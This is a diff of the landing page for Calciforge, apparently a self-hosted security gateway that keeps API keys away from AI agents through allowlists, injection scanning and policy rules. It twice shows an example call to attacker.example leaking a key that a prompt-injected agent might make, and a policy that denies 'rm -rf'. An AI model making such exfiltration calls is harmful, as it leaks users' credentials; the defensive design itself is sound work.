@@ -1,5 +1,6 @@
 ---
 layout: default
+title: Calciforge
 ---
 
 <style>
@@ -7,103 +8,230 @@ layout: default
   --calci-fire: #d97706;
   --calci-fire-bright: #f59e0b;
   --calci-stone: #44403c;
+  --calci-stone-soft: #78716c;
   --calci-paper: #fafaf9;
   --calci-ink: #1c1917;
+  --calci-line: #e7e5e4;
+  --calci-code-bg: #f5f5f4;
+  --calci-code-dark: #1c1917;
 }
-body { background: var(--calci-paper); color: var(--calci-ink); font-family: system-ui, -apple-system, sans-serif; line-height: 1.55; }
-h1, h2, h3 { color: var(--calci-stone); }
-h1 { font-size: 2.4rem; margin-bottom: 0.2rem; }
-.tagline { color: var(--calci-fire); font-style: italic; font-size: 1.15rem; margin: 0 0 1.5rem; }
-.hero-icons { display: flex; gap: 1.5rem; align-items: center; margin: 0 0 2rem; flex-wrap: wrap; }
-.hero-icon { display: flex; flex-direction: column; align-items: center; min-width: 80px; }
-.hero-icon svg { color: var(--calci-stone); }
-.hero-icon span { font-size: 0.8rem; color: var(--calci-stone); margin-top: 0.3rem; }
-.fire { color: var(--calci-fire); }
+body {
+  background: var(--calci-paper);
+  color: var(--calci-ink);
+  font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
+  line-height: 1.6;
+}
+.wordmark {
+  font-size: 3rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  margin: 0;
+  color: var(--calci-stone);
+}
+.wordmark .glow {
+  background: linear-gradient(180deg, var(--calci-fire-bright), var(--calci-fire));
+  background-clip: text;
+  -webkit-background-clip: text;
+  color: transparent;
+}
+.tagline {
+  font-style: italic;
+  font-size: 1.2rem;
+  color: var(--calci-fire);
+  margin: 0.2rem 0 1.5rem;
+}
+.lede {
+  font-size: 1.05rem;
+  color: var(--calci-ink);
+  margin-bottom: 1.5rem;
+}
+h2 { font-size: 1.4rem; margin-top: 2.5rem; color: var(--calci-stone); }
+h3 { font-size: 1.05rem; margin-top: 1.5rem; color: var(--calci-stone); }
+.aside {
+  background: rgba(217, 119, 6, 0.06);
+  border-left: 3px solid var(--calci-fire);
+  padding: 0.8rem 1.1rem;
+  margin: 1.5rem 0;
+  font-size: 0.95rem;
+  color: var(--calci-stone);
+}
+.aside strong { color: var(--calci-stone); }
 a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
 a:hover { border-bottom-color: var(--calci-fire); }
-.nav { margin: 1.5rem 0; padding: 0.7rem 0; border-top: 1px solid #e7e5e4; border-bottom: 1px solid #e7e5e4; }
-.nav a { margin-right: 1.5rem; font-weight: 500; }
-ul li { margin-bottom: 0.4rem; }
-code { background: #f5f5f4; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.92em; }
-pre code { background: transparent; padding: 0; }
-pre { background: #1c1917; color: #fafaf9; padding: 1rem; border-radius: 6px; overflow-x: auto; }
-small { color: var(--calci-stone); }
+.nav { margin: 1.2rem 0 2rem; padding: 0.6rem 0; border-top: 1px solid var(--calci-line); border-bottom: 1px solid var(--calci-line); font-size: 0.95rem; }
+.nav a { margin-right: 1.4rem; font-weight: 500; }
+ul li { margin-bottom: 0.35rem; }
+code {
+  background: var(--calci-code-bg);
+  padding: 0.1rem 0.35rem;
+  border-radius: 3px;
+  font-size: 0.92em;
+  font-family: ui-monospace, "SF Mono", Menlo, monospace;
+}
+pre {
+  background: var(--calci-code-dark);
+  color: var(--calci-paper);
+  padding: 1rem 1.2rem;
+  border-radius: 6px;
+  overflow-x: auto;
+  font-size: 0.88rem;
+  line-height: 1.5;
+}
+pre code { background: transparent; padding: 0; color: inherit; font-size: inherit; }
+.muted { color: var(--calci-stone-soft); }
+small { color: var(--calci-stone-soft); }
+hr { border: 0; border-top: 1px solid var(--calci-line); margin: 2.5rem 0; }
 </style>
 
-<div class="hero-icons" aria-hidden="true">
-  <div class="hero-icon">
-    <!-- Castle silhouette -->
-    <svg width="64" height="48" viewBox="0 0 64 48" fill="none">
-      <path d="M4 44 L4 24 L8 24 L8 18 L14 18 L14 24 L20 24 L20 12 L26 12 L26 6 L32 0 L38 6 L38 12 L44 12 L44 24 L50 24 L50 18 L56 18 L56 24 L60 24 L60 44 Z" fill="currentColor"/>
-      <rect x="28" y="28" width="8" height="16" fill="var(--calci-paper)"/>
-      <circle cx="32" cy="32" r="1.5" fill="currentColor"/>
-    </svg>
-    <span>Castle</span>
-  </div>
-  <div class="hero-icon">
-    <!-- Door with keyhole -->
-    <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
-      <rect x="10" y="4" width="28" height="44" rx="2" fill="currentColor"/>
-      <rect x="14" y="8" width="20" height="36" rx="1" fill="var(--calci-paper)"/>
-      <circle cx="24" cy="22" r="2.5" fill="currentColor"/>
-      <rect x="22.8" y="22" width="2.4" height="6" fill="currentColor"/>
-    </svg>
-    <span>Doors</span>
-  </div>
-  <div class="hero-icon">
-    <!-- Flame (Calcifer) -->
-    <svg width="40" height="48" viewBox="0 0 40 48" fill="none" class="fire">
-      <path d="M20 4 C16 12 8 16 8 28 C8 38 14 44 20 44 C26 44 32 38 32 28 C32 22 28 18 26 14 C24 18 22 18 22 14 C22 10 22 6 20 4 Z" fill="currentColor"/>
-      <path d="M20 22 C18 26 14 28 14 34 C14 38 16 42 20 42 C24 42 26 38 26 34 C26 30 24 28 22 24 C21 26 20 26 20 22 Z" fill="var(--calci-fire-bright)"/>
-    </svg>
-    <span>Calcifer</span>
-  </div>
-</div>
-
-# Calciforge
-
+<h1 class="wordmark">Calci<span class="glow">forge</span></h1>
 <p class="tagline">Keep your castle secure and moving.</p>
 
-A self-hosted security gateway for AI agents. Every agent gets its own
-bound contract — its own secrets, its own allowed destinations, its own
-audit trail — without sharing API keys with anyone or trusting the
-agent's own restraint.
+<p class="lede">A self-hosted security gateway for AI agents. Every agent
+gets its own bound contract — its own secrets, its own allowed
+destinations, its own audit trail — without sharing API keys or
+trusting the agent's own restraint.</p>
 
 <div class="nav">
-<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
 <a href="https://github.com/bglusman/calciforge">GitHub</a>
-<a href="https://github.com/bglusman/calciforge/blob/main/docs/architecture-review-2026-04-25.md">Architecture</a>
-<a href="https://github.com/bglusman/calciforge/tree/main/docs/roadmap">Roadmap</a>
+<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
+<a href="https://github.com/bglusman/calciforge/tree/main/docs">Docs</a>
 </div>
 
-## What it does
+<div class="aside">
+<strong>About the name.</strong> Calciforge is roughly "Calcifer's forge".
+Calcifer is the fire demon from Diana Wynne Jones's
+<em>Howl's Moving Castle</em> who's bound by contract to power the
+castle's magical front door — one door connecting to many places, with
+strict rules about who can pass and where. The metaphor felt apt for
+per-agent contracts that gate which secrets cross which thresholds.
+You don't need to know any of that to use the tool; it's just a name
+we liked that wouldn't collide with anything else in the space.
+</div>
 
-- **Holds the API key, not the agent.** Substitutes `{% raw %}{{secret:NAME}}{% endraw %}` at the gateway boundary so the agent never sees the real value.
-- **Per-secret destination allowlist.** A prompt-injected agent calling `https://attacker.example/?key={% raw %}{{secret:OPENAI_KEY}}{% endraw %}` returns 403 before the resolver is consulted.
-- **Multi-channel chat in.** `!secure` commands on Telegram, Matrix, WhatsApp; localhost paste UI for one-shot or bulk `.env` input.
-- **MCP server out.** Agents discover available secret *names* but never the values.
-- **Inbound + outbound content scanning.** Adversary-detector flags injection payloads on the way in, secret-shaped exfil on the way out.
-- **Starlark policy sidecar.** Per-tool decisions evaluated by `clashd`.
-- **mTLS host-agent.** Sensitive system ops (ZFS, systemd, PCT, git, exec) gated behind a separate authenticated daemon.
+## What it gives you
 
-## The vocabulary
+Calciforge sits between your AI agents and the rest of the world. The
+gateway enforces five overlapping concerns; you can adopt any subset.
 
-A working metaphor borrowed from a famously well-designed magical
-contract:
+### Secret management
 
-- **Calciforge** — the project / CLI / shipped tool. The forge.
-- **Calcifer** — a single agent's bound contract. Its specific deal with the door magic.
-- **Moving Castle** — a deployment hosting a household of Calcifers.
-- **Doors** — the thresholds the Calcifer guards.
-- **Doors to other Castles** — federation between Calciforge instances. ([roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/team-chatops-slack-discord.md))
+Your agent never holds the actual API key. The gateway does the
+substitution at the request boundary.
 
-## Status
+```toml
+# fnox.toml — the secret store the gateway resolves through
+[secrets]
+OPENAI_API_KEY = { encrypted = "age-encryption.org/v1..." }
+ANTHROPIC_API_KEY = { provider = "1password", key = "claude" }
+NPM_TOKEN = { default = "value-from-env-or-prompt" }
+```
 
-Solo-operator mature, multi-user team mode in progress. Mac-tested,
-Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
-headless deployment).
+Setting a new secret without it touching chat history (Telegram /
+Matrix / WhatsApp):
 
-## Install
+```
+You: !secure
+Bot: Single-secret URL: http://192.168.1.X:PORT/paste/<token>
+     Bulk-import URL:  http://192.168.1.X:PORT/bulk/<token>
+     Both expire in 5 minutes, single-use.
+```
+
+The bulk URL accepts a whole `.env`-shaped paste and returns per-key
+results (stored / already-exists / illegal-name / malformed).
+
+### Outbound traffic gating
+
+The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
+references at the moment of forwarding — and only if the destination
+is on the per-secret allowlist.
+
+```toml
+# /etc/calciforge/security-proxy.toml
+[secret_destination_allowlist]
+OPENAI_API_KEY = ["api.openai.com", "*.openai.com"]
+ANTHROPIC_API_KEY = ["api.anthropic.com"]
+GITHUB_TOKEN = ["api.github.com", "uploads.github.com"]
+```
+
+Without an allowlist entry: substitution is allowed everywhere
+(opt-in tightening). With an entry: anything else returns 403 before
+the resolver is even consulted, so a prompt-injected agent calling
+`https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
+fails before the secret value is loaded into memory.
+
+Outbound exfiltration is also content-scanned — secret-shaped strings
+flagged regardless of substitution syntax.
+
+### Inbound traffic gating
+
+Every upstream response is scanned for prompt-injection payloads
+before being returned to the agent. Configurable verdicts (Block /
+Review / Allow) routed via the policy plane.
+
+```python
+# clash-policy.star — Starlark policy evaluated by clashd
+def evaluate(ctx):
+    if ctx.tool == "Bash" and "rm -rf" in ctx.args.get("command", ""):
+        return Verdict.deny("destructive command requires manual approval")
+    if ctx.identity != "owner" and ctx.tool == "Write":
+        return Verdict.review("non-owner write — flag for review")
+    return Verdict.allow()
+```
+
+### Agent-facing tools (MCP)
+
+A built-in MCP server exposes secret *names* to agents but never
+returns values — the only way for an agent to use a secret is to
+emit `{% raw %}{{secret:NAME}}{% endraw %}` and let the gateway resolve
+on the way out. Designed so a compromised agent can enumerate names
+and fail to retrieve values.
+
+```json
+// ~/.claude/mcp-config.json
+{
+  "mcpServers": {
+    "calciforge-secrets": {
+      "command": "/usr/local/bin/mcp-server",
+      "transport": "stdio"
+    }
+  }
+}
+```
+
+### Multi-channel chat in
+
+Today: Telegram, Matrix, WhatsApp, Signal.
+
+```toml
+# /etc/calciforge/config.toml — channel configuration
+[[channels.telegram]]
+bot_token = "{% raw %}{{secret:TELEGRAM_BOT_TOKEN}}{% endraw %}"
+allowed_users = [7000000001, 7000000002]
+
+[[channels.matrix]]
+homeserver = "https://matrix.example.com"
+user_id = "@assistant:example.com"
+access_token = "{% raw %}{{secret:MATRIX_TOKEN}}{% endraw %}"
+
+[[channels.whatsapp]]
+session_dir = "~/.calciforge/whatsapp"
+allowed_numbers = ["+15555550100"]
+```
+
+Per-identity routing: each user gets their own active agent, their
+own secret allowlist, their own audit trail.
+
+### Sensitive system operations
+
+A separate authenticated daemon (`host-agent`) handles ZFS / systemd
+/ PCT / git / exec calls behind mTLS. Agents never get a shell
+directly; they call the daemon, which validates the operation
+shape against allowlist rules and runs through narrow sudoers
+wrappers.
+
+---
+
+## Quick install (Mac)
 
 ```bash
 git clone https://github.com/bglusman/calciforge
@@ -112,13 +240,38 @@ brew install fnox && fnox init
 bash scripts/install.sh
 ```
 
-See the [README](https://github.com/bglusman/calciforge/blob/main/README.md) for the full picture.
+Three services land as launchd agents:
+- `clashd` on `:9001` — Starlark policy engine
+- `security-proxy` on `:8888` — substitution + scanning + injection
+- `calciforge` — channel router (needs onboarding for an LLM provider)
+
+Route Claude Code through the gateway:
+
+```bash
+# ~/.zshrc
+export HTTPS_PROXY=http://localhost:8888
+```
+
+---
+
+## Status
+
+Solo-operator mature, multi-user team mode in progress. Mac-tested,
+Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
+headless deployment).
+
+The list of what works today and what's still in flight lives in the
+[README's status table](https://github.com/bglusman/calciforge/blob/main/README.md#what-works-today).
+The strategic architecture review (5 findings, in-flight implementation)
+will land at
+[`docs/architecture-review-2026-04-25.md`](https://github.com/bglusman/calciforge/blob/main/docs/architecture-review-2026-04-25.md)
+once this docs PR merges; speculative ideas being captured live in
+[`docs/roadmap/`](https://github.com/bglusman/calciforge/tree/main/docs/roadmap).
 
 ---
 
 <small>
-MIT-licensed. Some bundled tools carry their own licenses.
-The vocabulary is inspired by Diana Wynne Jones's <em>Howl's Moving Castle</em> as a metaphor for the system's
-per-agent contracts and reconfigurable doors — no characters, art, or text from the book or its film
-adaptation are used or referenced beyond name inspiration.
+MIT-licensed. Some bundled tools (e.g. fnox itself) carry their own
+licenses. The name's a nod to <em>Howl's Moving Castle</em>; nothing else
+from the book or its film adaptation is referenced or used.
 </small>
